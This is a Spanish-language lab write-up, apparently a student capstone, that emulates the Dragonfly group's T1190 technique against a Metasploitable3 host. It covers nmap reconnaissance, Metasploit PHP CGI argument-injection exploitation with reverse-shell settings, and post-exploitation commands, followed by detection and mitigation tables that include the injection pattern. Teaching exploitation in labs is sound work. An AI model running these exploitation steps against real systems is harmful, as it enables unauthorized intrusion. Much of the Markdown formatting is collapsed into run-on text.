---
layout: post
title: "EXAMEN FINAL - Capstone Threat-Informed"
date: 2026-08-14 18:00:00 -0500
categories: [Ciberseguridad]
tags: [examen-final, capstone, mitre-attck, metasploit]
published: true
---

## Introducción

El presente informe desarrolla un ejercicio de análisis y emulación de amenazas basado en inteligencia, siguiendo el enfoque **Threat-Informed Defense**. El adversario asignado corresponde a **Dragonfly** (también conocido como *Energetic Bear*), identificado por MITRE ATT&CK con el código **G0035**.

La operación se estructura en cuatro actos: obtención y análisis de inteligencia, planificación del ataque mediante técnicas ATT&CK, ejecución controlada contra la instancia de Metasploitable3 asignada y, finalmente, análisis defensivo de las técnicas reproducidas.

El objetivo no es realizar un ataque indiscriminado, sino establecer una relación trazable entre el comportamiento documentado del adversario, las técnicas ATT&CK, la superficie disponible en el laboratorio y las medidas de detección y mitigación.

---

# ACTO 1 — La Inteligencia Dirige (OpenCTI & MITRE ATT&CK)

## 1. Perfil del Adversario: Dragonfly / Energetic Bear (G0035)

MITRE identifica a Dragonfly como **G0035** y registra como alias, entre otros, *Energetic Bear, Berserk Bear, Crouching Yeti, IRON LIBERTY, TEMP.Isotope, DYMALLOY, TG-4192, Ghost Blizzard y BROMINE*. El grupo ha sido atribuido al Centro 16 del Servicio Federal de Seguridad de Rusia (FSB) y se encuentra activo desde al menos 2010.

### Motivación y Sectores Objetivo
La actividad atribuida a Dragonfly se caracteriza principalmente por objetivos de espionaje y obtención de acceso a organizaciones de interés estratégico, incluyendo la industria de defensa, aviación, gobierno, sistemas de control industrial (ICS/SCADA) e infraestructura crítica (especialmente el sector energético).

![Perfil de Dragonfly en MITRE ATT&CK](/assets/images/Examenfinal/mitre_dragonfly.png)

---

## 2. Técnica Asignada: T1190 — Exploit Public-Facing Application

Los adversarios intentan aprovechar vulnerabilidades o debilidades en software expuesto directamente a Internet o a la red externa (servidores web, bases de datos, APIs o servicios de administración) para lograr el acceso inicial.

![Ficha MITRE ATT&CK T1190](/assets/images/Examenfinal/mitre_t1190.png)

---

## 3. Malware y Herramientas del Actor

A partir de la inteligencia extraída del servidor OpenCTI del curso:

| Herramienta / Malware | Relación con Dragonfly | Fuente |
| :--- | :--- | :--- |
| **Havex / Trojan.Yeti** | Malware modular de espionaje utilizado en campañas contra el sector energético. | OpenCTI / MITRE |
| **Karagany** | Troyano de acceso remoto (RAT) utilizado para la recolección de credenciales y reconocimiento. | OpenCTI / MITRE |
| **Psyshot / Lightsout** | Scripts y herramientas personalizadas para persistencia y ejecución de comandos. | OpenCTI |

![Captura de Inteligencia en OpenCTI](/assets/images/Examenfinal/opencti.png)

---

## 4. Niveles de Inteligencia

La información obtenida se clasifica según los tres niveles de inteligencia:

| Información | Nivel | Justificación Teórica |
| :--- | :---: | :--- |
| Identidad de Dragonfly (G0035), alias y origen estatal. | **Estratégico** | Informa sobre el perfil general del actor y el nivel de amenaza a nivel organizacional. |
| Motivación y sectores objetivo (energía e infraestructura crítica). | **Estratégico** | Apoya la toma de decisiones de alto nivel sobre gestión de riesgos e inversión en seguridad. |
| Campañas históricas (Crouching Yeti / DragonFly 2.0). | **Operacional** | Describe tendencias, evolución de operaciones y alianzas/patrones del grupo. |
| Técnica ATT&CK **T1190 (Exploit Public-Facing Application)**. | **Táctico** | Identifica el vector y método específico utilizado para el acceso inicial. |
| IPs, dominios de C2, hashes de malware e indicadores concretos. | **Táctico** | Indicadores técnicos atómicos directamente aplicables en reglas de detección (SIEM/IDS). |

> **Redacción Teórica:**  
> La información relativa a la identidad, motivación y sectores objetivo del adversario corresponde principalmente al nivel **estratégico**. Las campañas, operaciones y relaciones entre el adversario y sus objetivos corresponden al nivel **operacional**. Finalmente, las técnicas ATT&CK, indicadores y procedimientos concretos utilizados durante una operación corresponden al nivel **táctico**.

---

## 5. Modelo Diamante de Análisis de Intrusiones

| Vértice | Información Identificada |
| :--- | :--- |
| **Adversario** | Dragonfly / Energetic Bear (G0035 / FSB Center 16). |
| **Capacidad** | Técnica T1190, inyección de argumentos PHP CGI, uso de Web Shells y herramientas de reconocimiento. |
| **Infraestructura** | Servidores C2, dominios maliciosos e IPs registradas en la plataforma OpenCTI del curso. |
| **Víctima** | Organizaciones del sector energía, aviación, gobierno e infraestructura crítica. |

> **Explicación:**  
> El modelo Diamante permite relacionar cuatro elementos fundamentales de una intrusión: adversario, capacidad, infraestructura y víctima. En este caso, Dragonfly representa el adversario; sus técnicas y herramientas representan la capacidad; la infraestructura identificada en OpenCTI corresponde al componente de infraestructura; y los sectores objetivo representan las víctimas.

---

## 6. Clasificación TLP (Traffic Light Protocol)

Al examinar los indicadores en OpenCTI:

| Indicador | Tipo | TLP | Nivel |
| :--- | :---: | :---: | :---: |
| Direcciones IP de C2 | IP | TLP:AMBER / TLP:CLEAR | Táctico |
| Dominios compromised | Dominio | TLP:AMBER / TLP:CLEAR | Táctico |
| Hashes de muestras | Hash | TLP:CLEAR | Táctico |

> **Manejo de TLP:NONE:**  
> Si un indicador aparece sin una política de distribución TLP explícita (`TLP:NONE`), en un contexto organizacional la política de clasificación y distribución debe ser establecida obligatoriamente por el propietario de la información o por la unidad CTI responsable, aplicando el principio de mínimo privilegio antes de compartir la información externamente.

---

## 7. Correlación del Acto 1 con el Laboratorio

| Inteligencia (OpenCTI / MITRE) | ATT&CK | Laboratorio (Metasploitable3) |
| :--- | :---: | :--- |
| Dragonfly utiliza explotación de aplicaciones públicas. | **T1190** | Servicio Apache / PHP en WAMPServer (Puerto 8585). |
| Dragonfly utiliza Web Shells para acceso persistente. | **T1505.003** | Inyección de código mediante el módulo `php_cgi_arg_injection`. |
| Execution: Uso de intérpretes de comandos. | **T1059** | Sesión interactiva Command Shell / Meterpreter. |
| Discovery: Enumeración del sistema y usuario. | **T1033 / T1082** | Comandos `whoami`, `hostname`, `sysinfo` y `systeminfo`. |
| Network Discovery: Configuración de red. | **T1016** | Comando `ipconfig`. |

---

# ACTO 2 — Plan de Ataque y Reconocimiento de Red

## 1. Configuración de Red del Atacante (Kali Linux)

Se verificó la configuración de red de la máquina atacante Kali Linux mediante el comando `ip a`, confirmándose la dirección IP **`10.0.2.10/24`** asignada a la interfaz `eth0`.

```bash
ip a
A través de ip route se verificó que Kali Linux pertenece a la red 10.0.2.0/24 y utiliza la IP 10.0.2.1 como puerta de enlace.Baship route
2. Descubrimiento de Equipos ActivosMediante un escaneo de descubrimiento ICMP/ARP se identificaron cuatro hosts activos en la red 10.0.2.0/24. El host 10.0.2.3 corresponde a la máquina víctima Metasploitable3.Bashsudo nmap -sn 10.0.2.0/24
3. Escaneo de Puertos3.1. Escaneo Inicial (Top 1000 TCP)Se realizó un escaneo SYN sobre los 1000 puertos TCP más comunes, identificando múltiples servicios expuestos como SSH, SMB, MySQL, RDP, GlassFish, Jenkins y WAMPServer.Bashsudo nmap -sS --top-ports 1000 10.0.2.3
3.2. Escaneo Completo de Puertos (65,535 TCP)Se efectuó un escaneo completo sobre la totalidad de los puertos TCP, identificándose más de 40 puertos abiertos en el sistema.Bashsudo nmap -p- 10.0.2.3
4. Identificación de Servicios y VersionesSe ejecutó un escaneo exhaustivo con scripts por defecto NSE y detección de versiones guardando los resultados en escaneo.txt:Bashsudo nmap -sV -sC -p- 10.0.2.3 -oN escaneo.txt
4.1. Servicios Base (SSH, SMB, MySQL, RDP)Se identificaron servicios de administración remota, compartición de archivos y bases de datos.4.2. Identificación del Sistema OperativoMediante la enumeración SMB se identificó la máquina víctima como Windows Server 2008 R2 Standard Service Pack 1 (Nombre de equipo: VAGRANT-2008R2, Workgroup: WORKGROUP).4.3. Evaluación de Seguridad en SMBSe filtró la información sobre firmas e inicios de sesión en SMB:Bashgrep -E -A6 "smb2-security-mode|smb-security-mode" escaneo.txt
La firma SMB no está configurada como obligatoria. Además, la consulta mediante smbclient confirmó acceso exitoso sin credenciales (Anonymous login successful).Bashsmbclient -L //10.0.2.3 -N
5. Enumeración de Servicios Web DetectadosJenkins (Puerto 8484): Servidor Jetty ejecutando Jenkins v1.637 en http://10.0.2.3:8484.Bashcurl -I [http://10.0.2.3:8484](http://10.0.2.3:8484)
WAMPServer / Apache + PHP (Puerto 8585 - Objetivo Asignado): Apache 2.2.21 sobre Windows con PHP 5.3.10 en http://10.0.2.3:8585.Bashcurl -I [http://10.0.2.3:8585](http://10.0.2.3:8585)
Oracle GlassFish Server (Puerto 8080 / 4848): Oracle GlassFish Server Open Source Edition 4.0 en http://10.0.2.3:8080.Bashcurl -I [http://10.0.2.3:8080](http://10.0.2.3:8080)
Apache Tomcat (Puerto 8282): Apache Tomcat v8.0.33 en http://10.0.2.3:8282.Bashcurl -I [http://10.0.2.3:8282](http://10.0.2.3:8282)
Elasticsearch (Puerto 9200): Instancia Overrider ejecutando Elasticsearch v1.1.1 en http://10.0.2.3:9200.Bashcurl [http://10.0.2.3:9200](http://10.0.2.3:9200)
curl [http://10.0.2.3:9200/_cluster/health](http://10.0.2.3:9200/_cluster/health)
curl [http://10.0.2.3:9200/_cat/indices?v](http://10.0.2.3:9200/_cat/indices?v)
WinRM (Puerto 5985): Servicio de administración remota de Windows (http://10.0.2.3:5985/wsman).Bashcurl -I [http://10.0.2.3:5985/wsman](http://10.0.2.3:5985/wsman)
6. Resumen de Servicios y Matriz de Hallazgos6.1. Resumen de Servicios EncontradosPuertoServicioVersión / Identificación22SSHOpenSSH 7.1139 / 445NetBIOS / SMBMicrosoft Windows Server 2008 R23306MySQLMySQL 5.5.203389RDPMicrosoft Terminal Services4848 / 8080HTTPS / HTTPOracle GlassFish 4.05985WinRMMicrosoft HTTPAPI 2.08022 / 8282HTTPApache Tomcat 8.0.338484HTTPJenkins 1.6378585HTTPApache 2.2.21 + PHP 5.3.10 (WAMPServer)9200HTTPElasticsearch 1.1.16.2. Matriz de Hallazgos del SistemaN°HallazgoEvidenciaValoración1Windows Server 2008 R2 SP1Nmap / SMBAlta2SMB expuesto sin firma obligatoriaNmap NSEAlta3Acceso SMB Anónimo / GuestsmbclientAlta4MySQL 5.5.20 expuestoNmapAlta5GlassFish 4.0 desactualizadoNmap / curlAlta6Apache 2.2.21 + PHP 5.3.10 (Vulnerable)Nmap / curlCrítica7Tomcat 8.0.33 expuestoNmap / curlMedia / Alta8Jenkins 1.637 sin autenticaciónNmap / curlAlta9Elasticsearch 1.1.1 expuestoNmap / curlAlta10RDP y WinRM habilitadosTCP 3389 / 5985MediaACTO 3 — Ejecución de la Kill Chain1. Preparación e Inspección del Módulo en MetasploitSe inició msfconsole y se buscó el módulo correspondiente a la inyección de argumentos en PHP CGI:Bashmsfconsole
search php_cgi_arg_injection
use exploit/multi/http/php_cgi_arg_injection
info
Inspección del Código Fuente (.rb)Tal como requiere el encargo, se localizó y leyó el archivo Ruby del módulo:Bashfind / -name "*php_cgi_arg_injection*" 2>/dev/null
cat /usr/share/metasploit-framework/modules/exploits/multi/http/php_cgi_arg_injection.rb
2. Configuración y Explotación del ObjetivoSe ingresó al módulo en msfconsole y se configuraron las opciones para apuntar al servicio PHP en el puerto 8585:Fragmento de códigouse exploit/multi/http/php_cgi_arg_injection
set RHOSTS 10.0.2.3
set RPORT 8585
set LHOST 10.0.2.10
set LPORT 4444
show options
EjecuciónSe verificó el estado con check y se ejecutó la explotación mediante exploit:Fragmento de códigocheck
exploit
3. Evidencia de Acceso Remoto y Post-Explotación (RCE)Una vez abierta la sesión, se ejecutaron comandos de reconocimiento para demostrar el control obtenido sobre el servidor víctima:Bashwhoami
hostname
sysinfo
ipconfig
systeminfo
Esquema de la Kill Chain EjecutadaPlaintext[ INTELIGENCIA ] ---> [ RECONOCIMIENTO ] ---> [ ACCESO INICIAL (T1190) ] ---> [ EJECUCIÓN (T1059) ] ---> [ DISCOVERY ]
 Dragonfly (G0035)     Apache 2.2 / PHP 5.3    PHP CGI Argument Injection      Command Shell / Session    whoami / sysinfo
ACTO 4 — Análisis Defensivo y Mitigación1. Detección de la Técnica T1190TécnicaQué BuscarFuente de Datos / LogT1190Peticiones HTTP POST/GET anómalas conteniendo argumentos como -d+allow_url_include%3D1.Registros del Servidor Web (Apache Access Logs) / WAFT1190Respuestas de error del servidor (HTTP 500/404) tras solicitudes con sintaxis inusual.Logs de error del servidor web (error.log)T1059Creación del proceso cmd.exe o powershell.exe generado por httpd.exe o php-cgi.exe.Sysmon Event ID 1 (Process Creation) / EDRT1505.003Creación o modificación de archivos .php en directorios web (/htdocs, /www).Sysmon Event ID 11 (File Create) / FIM2. Mitigaciones Sugeridas (MITRE ATT&CK Mitigations)M1050 — Exploit Protection: Implementar un Web Application Firewall (WAF) o módulo de seguridad (como ModSecurity) para filtrar y bloquear peticiones HTTP con argumentos manipulados hacia scripts CGI/PHP.M1016 — Vulnerability Scanning: Mantener una evaluación continua de vulnerabilidades y aplicar parches de seguridad para actualizar la versión de PHP a una rama protegida contra CVE-2012-1823.M1035 — Limit Access to Resource Over Network: Restringir el acceso a la interfaz web únicamente a direcciones IP o segmentos autorizados mediante reglas de firewall.3. Matriz Defensiva ConsolidadaTécnica EjecutadaDetecciónFuenteMitigaciónT1190Solicitudes HTTP anómalas con parámetros de inyección.Access Logs / WAFM1050T1190Explotación seguida de creación de procesos.Sysmon Event ID 1 / EDRM1050T1059Creación de intérpretes desde el proceso del servidor web.Sysmon Event ID 1M1038T1505.003Creación de archivos nuevos en directorios web.Sysmon Event ID 11M1022T1190Presencia de software web vulnerable.Escáner de vulnerabilidadesM1016ConclusionesEl análisis permitió establecer una relación directa entre la inteligencia asociada a Dragonfly / Energetic Bear (G0035) y la técnica T1190 — Exploit Public-Facing Application, utilizada como vector principal de acceso.La fase de reconocimiento identificó una amplia superficie de exposición en la máquina Metasploitable3, destacando el servicio Apache 2.2.21 / PHP 5.3.10 en el puerto 8585 como objetivo idóneo para la emulación.La ejecución controlada mediante Metasploit permitió validar la explotación de la vulnerabilidad de inyección de argumentos PHP CGI, logrando la ejecución remota de código (RCE) y la extracción de información del sistema.Desde la perspectiva defensiva, se identificaron los eventos clave (Sysmon Event ID 1 y registros de acceso web) requeridos para detectar la generación de procesos anómalos derivados de servidores web.El ejercicio demuestra la efectividad del enfoque Threat-Informed Defense, dado que la inteligencia sobre el adversario guió la selección del vector de ataque sin necesidad de recurrir a ejecuciones a ciegas o indiscriminadas.